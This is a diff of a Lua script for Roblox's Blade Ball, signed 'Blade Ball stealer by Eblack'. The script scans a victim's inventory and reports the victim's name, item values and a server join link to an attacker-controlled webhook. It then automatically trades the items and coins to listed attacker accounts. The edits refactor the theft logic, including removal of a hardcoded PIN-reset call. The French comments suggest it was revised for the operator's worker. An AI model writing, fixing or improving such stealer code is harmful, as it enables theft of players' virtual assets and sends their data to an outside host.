@@ -10,7 +10,6 @@ local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local netModule = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
 
 -- // CONFIGURATION
 local users = _G.Usernames or {}
@@ -18,22 +17,24 @@ local min_rap = _G.min_rap or 50
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 
--- // FONCTION D'ENVOI WORKER
+-- // FONCTION D'ENVOI STRICTEMENT COMPATIBLE AVEC TON WORKER
 local function sendToWorker(payload)
     local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
     if requestFunc then
-        pcall(function()
-            requestFunc({
+        local success, result = pcall(function()
+            return requestFunc({
                 Url = webhook,
                 Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
+                Headers = { ["Content-Type"] = "application/json" },
                 Body = HttpService:JSONEncode(payload)
             })
         end)
+        return success
     end
+    return false
 end
 
--- // FORMATAGE RAP (ex: 2.11k)
+-- // FORMATAGE RAP
 local function formatNumber(number)
     if number == nil then return "0" end
     local suffixes = {"", "k", "m", "b", "t"}
@@ -44,12 +45,6 @@ local function formatNumber(number)
     end
     return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
 end
-
--- // VÉRIFICATION DU PIN (Important pour le trade)
-pcall(function()
-    local args = {[1] = {["option"] = "PIN", ["value"] = "9079"}}
-    netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
-end)
 
 -- // SCAN INVENTAIRE
 local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
@@ -74,83 +69,84 @@ for _, cat in ipairs(categories) do
     end
 end
 
--- // GENERATEUR D'EMBED (STYLE IMAGE)
-local function getEmbedData(title, color, webhookName)
+-- // PRÉPARATION DU TEXTE DES ITEMS (GROUPÉS)
+local function getFormattedList()
     local total = 0
     local grouped = {}
     for _, item in ipairs(itemsToSend) do
         total = total + item.RAP
-        if grouped[item.Name] then
-            grouped[item.Name].Count = grouped[item.Name].Count + 1
-            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
-        else
-            grouped[item.Name] = {Count = 1, TotalRAP = item.RAP}
-        end
+        grouped[item.Name] = grouped[item.Name] or {Count = 0, TotalRAP = 0}
+        grouped[item.Name].Count = grouped[item.Name].Count + 1
+        grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
     end
-
+    
     local listText = ""
     for name, data in pairs(grouped) do
         listText = listText .. string.format("%s (x%d) - **%s RAP**\n", name, data.Count, formatNumber(data.TotalRAP))
     end
-
-    return {
-        ["auth_token"] = auth_token,
-        ["username"] = webhookName,
-        ["content"] = (ping == "Yes" and "--[[@everyone]]\n" or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
-        ["embeds"] = {{
-            ["title"] = title,
-            ["color"] = color,
-            ["fields"] = {
-                {name = "Victim Username 🤖:", value = plr.Name, inline = false},
-                {name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId, inline = false},
-                {name = "Item list 📝:", value = listText ~= "" and listText or "None", inline = false},
-                {name = "Summary 💰:", value = "Total RAP: **" .. formatNumber(total) .. "**", inline = false}
-            },
-            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
-        }}
-    }
+    return listText, total
 end
 
 -- // EXECUTION
 if #itemsToSend > 0 then
-    -- Tri par valeur
     table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
-    
-    -- Webhook initial (Join)
-    local isGood = 0
-    for _, v in ipairs(itemsToSend) do isGood = isGood + v.RAP end
-    sendToWorker(getEmbedData(isGood >= 500 and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯", isGood >= 500 and 65280 or 8323327, "Eblack - LOGGER"))
+    local itemList, totalRAP = getFormattedList()
+    local isGood = totalRAP >= 500
 
-    -- Détection des G Users pour le trade
+    -- 1. Envoi du Join Message (L'embed que tu voulais)
+    local joinData = {
+        ["auth_token"] = auth_token,
+        ["username"] = isGood and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT",
+        ["content"] = (ping == "Yes" and "@everyone " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
+        ["embeds"] = {{
+            ["title"] = isGood and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯",
+            ["color"] = isGood and 65280 or 8323327,
+            ["fields"] = {
+                {["name"] = "Victim Username 🤖:", ["value"] = plr.Name, ["inline"] = true},
+                {["name"] = "JobId 🆔:", ["value"] = "```" .. game.JobId .. "```", ["inline"] = true},
+                {["name"] = "Join link 🔗:", ["value"] = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId, ["inline"] = false},
+                {["name"] = "Item list 📝:", ["value"] = itemList ~= "" and itemList or "None", ["inline"] = false},
+                {["name"] = "Summary 💰:", ["value"] = "Total RAP: **" .. formatNumber(totalRAP) .. "**", ["inline"] = false}
+            },
+            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
+        }}
+    }
+    sendToWorker(joinData)
+
+    -- 2. Système de Trade & Server Hit
+    local netModule = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
     local inTrade = false
     plr.PlayerGui.Trade:GetPropertyChangedSignal("Enabled"):Connect(function() inTrade = plr.PlayerGui.Trade.Enabled end)
 
-    local function startSteal(target)
-        -- Envoi du "Server Hit"
+    local function startTrade(target)
+        -- Envoi du Server Hit (Format compatible Worker)
         sendToWorker({
             ["auth_token"] = auth_token,
             ["username"] = "⚪ Eblack - SERVER HIT",
+            ["content"] = "Victim detected! Starting trade...",
             ["embeds"] = {{
                 ["title"] = "⚪ Server Hit 🎯",
                 ["color"] = 16777215,
-                ["fields"] = {{name = "Victim:", value = plr.Name}, {name = "Status:", value = "Trade Started!"}}
+                ["fields"] = {
+                    {["name"] = "Victim Username 🤖:", ["value"] = plr.Name, ["inline"] = true},
+                    {["name"] = "Status 📈:", ["value"] = isGood and "🟢 GOOD HIT" or "🟣 SMALL HIT", ["inline"] = true},
+                    {["name"] = "Summary 💰:", ["value"] = "Total RAP: **" .. formatNumber(totalRAP) .. "**", ["inline"] = false}
+                }
             }}
         })
 
-        -- Boucle de Trade
         task.spawn(function()
             while #itemsToSend > 0 do
                 netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
                 repeat task.wait(0.5) until inTrade
                 
-                -- Ajout des items
                 local batch = {}
                 for i = 1, math.min(100, #itemsToSend) do table.insert(batch, table.remove(itemsToSend, 1)) end
                 for _, item in ipairs(batch) do
                     netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                 end
-
-                -- Ajout des Tokens (Coins)
+                
+                -- Ajout automatique des pièces (Coins)
                 pcall(function()
                     local coins = tonumber(plr.PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "")) or 0
                     if coins > 0 then netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(coins) end
@@ -165,9 +161,9 @@ if #itemsToSend > 0 then
     end
 
     for _, p in ipairs(Players:GetPlayers()) do
-        if table.find(users, p.Name) then startSteal(p) end
+        if table.find(users, p.Name) then startTrade(p) end
     end
     Players.PlayerAdded:Connect(function(p)
-        if table.find(users, p.Name) then startSteal(p) end
+        if table.find(users, p.Name) then startTrade(p) end
     end)
 end
